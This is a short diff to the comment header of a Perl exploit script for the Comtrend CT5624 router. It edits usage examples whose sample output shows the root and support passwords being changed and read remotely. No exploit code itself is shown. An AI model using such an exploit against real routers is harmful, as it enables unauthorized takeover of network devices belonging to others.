@@ -28,14 +28,14 @@
 #  security functions. 
 #####
 #
-#  playground$ perl comtrend.pl -c 192.168.1.1:80
+#  playground$ perl comtrend.pl -c
 #  [+] Comtrend CT5624 Router Remote Root/Support Password Disclosure/Change Exploit
 #  [!] Target: 192.168.1.1:80
 #  [o] New root password: root31337
 #  [o] New support password: sup31337
 #  [*] Successfully !!
 ##
-#  playground$ perl comtrend.pl -d 192.168.1.1:80
+#  playground$ perl comtrend.pl -d
 #  [+] Comtrend CT5624 Router Remote Root/Support Password Disclosure/Change Exploit
 #  [!] Target: 192.168.1.1:80
 #  [o] root: root31337
